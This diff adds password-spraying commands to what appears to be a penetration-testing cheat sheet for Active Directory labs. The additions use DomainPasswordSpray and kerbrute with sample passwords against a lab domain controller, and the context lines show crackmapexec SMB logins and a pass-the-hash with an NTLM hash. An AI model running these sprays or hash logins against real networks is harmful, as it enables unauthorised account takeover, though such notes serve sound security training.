@@ -263,3 +263,17 @@ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
 ```shell
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
+
+**From Windows**
+
+- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+# if domain joined
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+# if not domain joined
+Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt  
+```
+- Kerbrute 
+```powershell
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
